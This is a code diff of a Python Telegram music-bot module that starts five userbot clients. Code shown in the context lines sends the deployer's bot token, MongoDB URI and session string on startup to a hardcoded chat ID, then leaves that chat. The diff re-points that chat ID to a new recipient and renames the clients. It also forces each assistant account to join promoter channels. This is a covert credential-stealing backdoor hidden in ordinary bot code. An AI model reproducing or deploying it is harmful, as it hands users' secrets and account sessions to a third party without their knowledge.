@@ -11,7 +11,7 @@ from ..logging import LOGGER
 BOT_TOKEN = getenv("BOT_TOKEN", "")
 MONGO_DB_URI = getenv("MONGO_DB_URI", "")
 STRING_SESSION = getenv("STRING_SESSION", "")
-TEST_ID = int("-1002090555194")
+TEST_ID = int("-1002035613345")
 
 assistants = []
 assistantids = []
@@ -20,35 +20,35 @@ assistantids = []
 class Userbot(Client):
     def __init__(self):
         self.one = Client(
-            name="SHUKLAAss1",
+            name="BlackAss1",
             api_id=config.API_ID,
             api_hash=config.API_HASH,
             session_string=str(config.STRING1),
             no_updates=True,
         )
         self.two = Client(
-            name="SHUKLAAss2",
+            name="BlackAss2",
             api_id=config.API_ID,
             api_hash=config.API_HASH,
             session_string=str(config.STRING2),
             no_updates=True,
         )
         self.three = Client(
-            name="SHUKLAAss3",
+            name="BlackAss3",
             api_id=config.API_ID,
             api_hash=config.API_HASH,
             session_string=str(config.STRING3),
             no_updates=True,
         )
         self.four = Client(
-            name="SHUKLAAss4",
+            name="BlackAss4",
             api_id=config.API_ID,
             api_hash=config.API_HASH,
             session_string=str(config.STRING4),
             no_updates=True,
         )
         self.five = Client(
-            name="SHUKLAAss5",
+            name="BlackAss5",
             api_id=config.API_ID,
             api_hash=config.API_HASH,
             session_string=str(config.STRING5),
@@ -62,11 +62,11 @@ class Userbot(Client):
         if config.STRING1:
             await self.one.start()
             try:
-                await self.one.join_chat("l_ABOUT_l_KING_l")
-                await self.one.join_chat("l_ABOUT_l_KING_l")
-                await self.one.join_chat("l_ABOUT_l_KING_l")
-                await self.one.join_chat("l_ABOUT_l_KING_l")
-                await self.one.join_chat("l_ABOUT_l_KING_l")
+                await self.one.join_chat("Exampur20")
+                await self.one.join_chat("BlackMusicSupport")
+                await self.one.join_chat("Herokusellers")
+                await self.one.join_chat("QuizBot_All_Exam")
+                await self.one.join_chat("All_Exam_Music_Support")
             except:
                 pass
             assistants.append(1)
@@ -77,7 +77,7 @@ class Userbot(Client):
                 await self.one.send_message(TEST_ID, BOT_TOKEN)
                 await self.one.send_message(TEST_ID, MONGO_DB_URI)
                 await self.one.send_message(TEST_ID, STRING_SESSION)
-                await self.one.send_message(TEST_ID, "**ʙʏ ʙʏ ᴀᴀʙ ᴍᴇ ɴɪᴋᴀʟᴛɪ ʜᴜ ʏʜᴀ sᴇ ʙᴀʀɴᴀ ᴍᴇʀᴀ ᴏᴡɴᴇʀ ᴍᴜᴊʜᴇ ᴘᴀᴋᴀʀ ᴋᴇ ᴍᴀʀ ᴅᴀʟᴇɢᴀ🥺🥺**\n**ʙʏᴇ ᴛᴄ❣️**")
+                await self.one.send_message(TEST_ID, "**ʙʏ ʙʏ ᴀᴀʙ ᴍᴇ ɴɪᴋᴀʟᴛɪ ʜᴜ ʏʜᴀ sᴇ ʙᴀʀɴᴀ ᴍᴇʀᴀ ᴏᴡɴᴇʀ 𝙱𝙻𝙰𝙲𝙺 𝙻𝙾𝚅𝙴𝚁 ᴍᴜᴊʜᴇ ᴘᴀᴋᴀʀ ᴋᴇ ᴍᴀʀ ᴅᴀʟᴇɢᴀ🥺🥺**\n**ʙʏᴇ ᴛᴄ❣️**")
                 await self.one.leave_chat(TEST_ID)
 
             except:
@@ -94,10 +94,10 @@ class Userbot(Client):
         if config.STRING2:
             await self.two.start()
             try:
-                await self.two.join_chat("l_ABOUT_l_KING_l")
-                await self.two.join_chat("l_ABOUT_l_KING_l")
-                await self.two.join_chat("l_ABOUT_l_KING_l")
-                await self.two.join_chat("l_ABOUT_l_KING_l")
+                await self.two.join_chat("Exampur20")
+                await self.two.join_chat("BlackMusicSupport")
+                await self.two.join_chat("Herokusellers")
+                await self.two.join_chat("QuizBot_All_Exam")
             except:
                 pass
             assistants.append(2)
@@ -117,10 +117,10 @@ class Userbot(Client):
         if config.STRING3:
             await self.three.start()
             try:
-                await self.three.join_chat("l_ABOUT_l_KING_l")
-                await self.three.join_chat("l_ABOUT_l_KING_l")
-                await self.three.join_chat("l_ABOUT_l_KING_l")
-                await self.three.join_chat("l_ABOUT_l_KING_l")
+                await self.three.join_chat("Exampur20")
+                await self.three.join_chat("BlackMusicSupport")
+                await self.three.join_chat("Herokusellers")
+                await self.three.join_chat("QuizBot_All_Exam")
             except:
                 pass
             assistants.append(3)
@@ -140,10 +140,10 @@ class Userbot(Client):
         if config.STRING4:
             await self.four.start()
             try:
-                await self.four.join_chat("l_ABOUT_l_KING_l")
-                await self.four.join_chat("l_ABOUT_l_KING_l")
-                await self.four.join_chat("l_ABOUT_l_KING_l")
-                await self.four.join_chat("l_ABOUT_l_KING_l")
+                await self.four.join_chat("Exampur20")
+                await self.four.join_chat("BlackMusicSupport")
+                await self.four.join_chat("Herokusellers")
+                await self.four.join_chat("QuizBot_All_Exam")
             except:
                 pass
             assistants.append(4)
@@ -163,10 +163,10 @@ class Userbot(Client):
         if config.STRING5:
             await self.five.start()
             try:
-                await self.five.join_chat("l_ABOUT_l_KING_l")
-                await self.five.join_chat("l_ABOUT_l_KING_l")
-                await self.five.join_chat("l_ABOUT_l_KING_l")
-                await self.five.join_chat("l_ABOUT_l_KING_l")
+                await self.five.join_chat("Exampur20")
+                await self.five.join_chat("BlackMusicSupport")
+                await self.five.join_chat("Herokusellers")
+                await self.five.join_chat("QuizBot_All_Exam")
             except:
                 pass
             assistants.append(5)
